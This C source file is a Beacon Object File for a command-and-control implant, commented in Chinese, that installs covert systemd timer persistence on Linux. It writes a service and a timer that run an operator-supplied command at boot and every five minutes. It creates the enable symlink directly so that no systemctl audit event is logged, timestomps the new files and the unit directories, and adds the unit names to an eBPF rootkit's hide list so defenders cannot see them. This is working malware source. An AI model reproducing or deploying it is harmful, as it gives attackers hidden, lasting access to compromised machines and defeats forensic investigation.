/// systemd_persist.c — BOF: install a systemd timer persistence unit (P3/G5)
///
/// Compile: gcc -c -o systemd_persist.o systemd_persist.c -include bof_api.h -Os -fPIC
/// Usage:   execute bof systemd_persist.o <command> [unit_name]
///
/// 方案依据：完全体清单 G5（systemd timer/service —— "systemd 系统上比 cron
/// 更原生，且可控启动顺序"）。G1 cron 已 ✅，本条是**机制冗余**：现代发行版
/// 上 `cron` 可能根本没装（Ubuntu 24.04 默认无 cron 包），而 systemd 一定在。
///
/// 落地物（三件，缺一不可）：
///   ① /etc/systemd/system/<name>.service        —— ExecStart 跑我们的命令
///   ② /etc/systemd/system/<name>.timer          —— OnBootSec + OnUnitActiveSec
///   ③ /etc/systemd/system/timers.target.wants/<name>.timer -> ../<name>.timer
///
/// ③ 是**符号链接**，不是普通文件：systemd 只启动 `timers.target` 的 wants
/// 依赖里列出的定时器，而 `systemctl enable` 干的就是建这条链接。少了它，
/// 单元文件在磁盘上"看得见但永远不会跑"——一个只能被对手发现、不能复活载荷
/// 的纯负债。链接用 symlinkat(2) 直接建，**不 execve `systemctl enable`**：
/// 后者既是一条 execve 审计事件，又会把 "enable" 写进 systemd 的 journal
/// （P2-E 的核心结论 —— 动作本身的可观测性比结果更重要）。
///
/// 同样**不 execve `systemctl daemon-reload`**：systemd 会 inotify 监视
/// 单元目录，新单元在下次 reload 时被识别；而本机制的目的是**开机复活**，
/// 开机时一定是从磁盘全量读的，所以不 reload 不影响持久化语义，只是本次
/// 运行时 `systemctl list-timers` 里还看不到。调用方要立即生效可自行
/// daemon-reload（并自行承担那一条审计事件）。
///
/// 隐匿处理：
///   · 两个单元文件的 atime/mtime 对齐到 /etc/systemd/system 的目录 mtime
///     （与 cron_persist 同款 timestomp）—— 避免 "刚创建" 的 mtime 特征。
///   · RandomizedDelaySec：真实发行版定时器（apt-daily.timer 等）普遍用它，
///     既是原生态特征，也让每次激活的时刻不落在固定相位上（时序隐匿）。
///   · 回执里给出 hide_add 建议：`ls -la /etc/systemd/system/` 属于对手会跑
///     的命令（方案 §1 I 表），单元文件名必须进 hide_names 才算闭环（G7）。
///
/// 已存在同名单元时**拒绝覆盖**并报错 —— 覆盖系统单元会直接破坏目标机，
/// 那是比被发现更糟的结果。

#include "bof_api.h"

#define O_WRONLY   01
#define O_CREAT    0100
#define O_TRUNC    01000

#define SYS_UNITDIR  "/etc/systemd/system"
#define SYS_WANTSDIR "/etc/systemd/system/timers.target.wants"

/// 名字里出现这些字符会破坏单元文件名/路径（不防注入，只防拼出错误路径）。
static int ax_name_ok(const char *s) {
    if (!s || !s[0]) return 0;
    for (int i = 0; s[i]; i++) {
        char c = s[i];
        if (c == '/' || c == '.' || c == ' ' || c == '\t') return 0;
        if (c < 0x21 || c > 0x7e) return 0;
    }
    return 1;
}

/// 写一个文件（0600 → 内容写完后 chmod 到 mode）。返回 0 成功。
static int ax_write_mode(const char *path, const char *data, int len, int mode) {
    int fd = AxOpenFile(path, O_WRONLY | O_CREAT | O_TRUNC, 0600);
    if (fd < 0) return -1;
    int n = AxWriteFile(fd, data, len);
    AxCloseFile(fd);
    if (n != len) return -2;
    AxChmod(path, mode);
    return 0;
}

/// 存在性判定：能 open 到就是存在（单元文件都是 0644，root 一定能开）。
static int ax_exists(const char *path) {
    int fd = AxOpenFile(path, 00 /*O_RDONLY*/, 0);
    if (fd < 0) return 0;
    AxCloseFile(fd);
    return 1;
}

/* AxHideNameAdd 的返回码 -> 人类可读（含义见 bof_api.h）。 */
static const char *ax_hide_rc(int rc) {
    if (rc == 0)  return "ok";
    if (rc == -2) return "no-map";
    return "fail";
}

void go(char *args, int args_len) {
    datap parser;
    BeaconDataParse(&parser, args, args_len);

    int cmd_len = 0;
    char *cmd = BeaconDataExtract(&parser, &cmd_len);
    int name_len = 0;
    char *name = BeaconDataExtract(&parser, &name_len);

    if (!cmd || cmd_len <= 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] systemd_persist: missing command argument\n");
        return;
    }
    /* 参数 blob 不保证 NUL 终止（最后一个字段处直接结束）—— 拷进本地缓冲。 */
    char namebuf[64];
    namebuf[0] = 0;
    if (name && name_len > 0) {
        int n = name_len > (int)sizeof(namebuf) - 1 ? (int)sizeof(namebuf) - 1 : name_len;
        AxMemcpy(namebuf, name, n);
        namebuf[n] = 0;
    } else {
        AxStrcpy(namebuf, "sys-maintenance");
    }
    if (!ax_name_ok(namebuf)) {
        BeaconPrintf(CALLBACK_ERROR,
                     "[-] systemd_persist: bad unit name '%s' (no '.', '/', space)\n",
                     namebuf);
        return;
    }

    /* 命令同样拷进本地缓冲（要拼进 ExecStart=）。 */
    char cmdbuf[512];
    if (cmd_len > (int)sizeof(cmdbuf) - 1) {
        BeaconPrintf(CALLBACK_ERROR, "[-] systemd_persist: command too long (max %d)\n",
                     (int)sizeof(cmdbuf) - 1);
        return;
    }
    AxMemcpy(cmdbuf, cmd, cmd_len);
    cmdbuf[cmd_len] = 0;

    /* systemd 不在（容器/非 systemd 发行版）→ 早退，别留半套文件。 */
    if (!ax_exists("/run/systemd/system")) {
        BeaconPrintf(CALLBACK_ERROR,
                     "[-] systemd_persist: /run/systemd/system missing — not a systemd host\n");
        return;
    }

    char svc[160], tmr[160], lnk[224], rel[96];
    AxSnprintf(svc, sizeof(svc), "%s/%s.service", SYS_UNITDIR, namebuf);
    AxSnprintf(tmr, sizeof(tmr), "%s/%s.timer",   SYS_UNITDIR, namebuf);
    AxSnprintf(lnk, sizeof(lnk), "%s/%s.timer",   SYS_WANTSDIR, namebuf);
    AxSnprintf(rel, sizeof(rel), "../%s.timer",   namebuf);

    /* 撞名检查（含发行版单元目录）。覆盖系统单元 = 直接弄坏目标机，
     * 比被发现严重得多 —— 撞名一律拒绝，由操作员换名字。 */
    const char *alts[] = { "/usr/lib/systemd/system", "/lib/systemd/system", 0 };
    for (int i = 0; alts[i]; i++) {
        char p[192];
        AxSnprintf(p, sizeof(p), "%s/%s.service", alts[i], namebuf);
        if (ax_exists(p)) {
            BeaconPrintf(CALLBACK_ERROR,
                         "[-] systemd_persist: '%s.service' already exists in %s — refusing\n",
                         namebuf, alts[i]);
            return;
        }
        AxSnprintf(p, sizeof(p), "%s/%s.timer", alts[i], namebuf);
        if (ax_exists(p)) {
            BeaconPrintf(CALLBACK_ERROR,
                         "[-] systemd_persist: '%s.timer' already exists in %s — refusing\n",
                         namebuf, alts[i]);
            return;
        }
    }

    /* Timestomp 基准必须在**创建任何文件之前**取：创建动作会把目录 mtime
     * 置为 now，之后再读就只能读到 now（等于没做），而且白白留下一个
     * "这个目录刚被动过" 的痕迹。取到原值后，既用它给新文件定时间，也用
     * 它把目录恢复原状 —— 目标机上看到的仍是"很久没动的目录 + 同龄文件"。
     * wants 子目录同理（建符号链接也会 bump 它）。 */
    long as = 0, ans = 0, ms = 0, mns = 0;
    long was = 0, wans = 0, wms = 0, wmns = 0;
    int have_dir_times  = (AxFileTimes(SYS_UNITDIR, &as, &ans, &ms, &mns) == 0);
    int have_want_times = (AxFileTimes(SYS_WANTSDIR, &was, &wans, &wms, &wmns) == 0);

    char content[1024];
    int n;

    n = AxSnprintf(content, sizeof(content),
        "[Unit]\n"
        "Description=%s maintenance\n"
        "After=network-online.target\n"
        "Wants=network-online.target\n"
        "\n"
        "[Service]\n"
        "Type=oneshot\n"
        "ExecStart=%s\n", namebuf, cmdbuf);
    if (n <= 0 || n >= (int)sizeof(content)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] systemd_persist: service unit too long\n");
        return;
    }
    if (ax_write_mode(svc, content, n, 0644) != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] systemd_persist: cannot write %s\n", svc);
        return;
    }

    /* RandomizedDelaySec：真实发行版定时器普遍使用（apt-daily.timer 等），
     * 既是原生态特征，也让激活时刻不落在固定相位上。 */
    n = AxSnprintf(content, sizeof(content),
        "[Unit]\n"
        "Description=%s maintenance\n"
        "\n"
        "[Timer]\n"
        "OnBootSec=3min\n"
        "OnUnitActiveSec=5min\n"
        "RandomizedDelaySec=45\n"
        "Persistent=true\n"
        "\n"
        "[Install]\n"
        "WantedBy=timers.target\n", namebuf);
    if (n <= 0 || n >= (int)sizeof(content)) {
        AxUnlink(svc);
        BeaconPrintf(CALLBACK_ERROR, "[-] systemd_persist: timer unit too long\n");
        return;
    }
    if (ax_write_mode(tmr, content, n, 0644) != 0) {
        AxUnlink(svc);
        BeaconPrintf(CALLBACK_ERROR, "[-] systemd_persist: cannot write %s\n", tmr);
        return;
    }

    /* ③ wants 链接。EEXIST 视为成功（重复下发是幂等操作，不是错误）。 */
    int lr = AxSymlink(rel, lnk);
    int link_ok = (lr == 0);
    if (!link_ok && ax_exists(lnk)) link_ok = 1;
    if (!link_ok) {
        AxUnlink(svc);
        AxUnlink(tmr);
        BeaconPrintf(CALLBACK_ERROR,
                     "[-] systemd_persist: symlink %s failed (err=%d) — rolled back\n",
                     lnk, lr);
        return;
    }

    /* Timestomp：两个单元文件对齐到**创建前**记录的目录 mtime，随后目录自身
     * 也恢复原值 —— 否则 /etc/systemd/system 的 mtime 会停在"刚刚"，这比
     * 文件本身的时间戳显眼得多（`ls -la /etc/systemd/system` 一眼可见）。 */
    if (have_dir_times) {
        AxUtimensat(-100, svc, as, ans, ms, mns);
        AxUtimensat(-100, tmr, as, ans, ms, mns);
        AxUtimensat(-100, SYS_UNITDIR, as, ans, ms, mns);
    }
    if (have_want_times)
        AxUtimensat(-100, SYS_WANTSDIR, was, wans, wms, wmns);

    /* G7 闭环：单元文件名是**加载 eBPF 之后**才出现在磁盘上的，ebpf_load 的
     * <names> 参数管不到 —— 于是 `ls -la /etc/systemd/system/`（方案 §1 I 表里
     * 对手会跑的命令）直接看见复活层。这里自动补写 hide_names。
     *
     * 隐藏失败**不改控制流**：持久化已经落地了，"这次没藏住"不该让安装整体失败。
     * 注意 hide_names 的 key 是**纯 dirent 名、无目录限定** —— 藏 `<name>.timer`
     * 会把全系统任何同名 dirent 一并藏掉，所以单元名必须足够特异性。 */
    char sname[96], tname[96];
    AxSnprintf(sname, sizeof(sname), "%s.service", namebuf);
    AxSnprintf(tname, sizeof(tname), "%s.timer",   namebuf);
    int hsvc = AxHideNameAdd((const char *)0, sname);
    int htmr = AxHideNameAdd((const char *)0, tname);

    BeaconPrintf(CALLBACK_OUTPUT,
                 "[+] systemd_persist: installed %s.{service,timer} (boot+3min, every 5min ±45s)\n"
                 "    wants: %s\n"
                 "    hide: %s -> %s, %s -> %s\n",
                 namebuf, lnk, sname, ax_hide_rc(hsvc), tname, ax_hide_rc(htmr));
    if (hsvc < 0 || htmr < 0)
        BeaconPrintf(CALLBACK_OUTPUT,
                     "    [*] 未自动登记（eBPF 未加载 / pin 未知 / map 满）—— "
                     "对手 `ls -la %s` 能看见。手工补：\n"
                     "        execute bof hide_add.o <pin> %s %s\n",
                     SYS_UNITDIR, sname, tname);
}
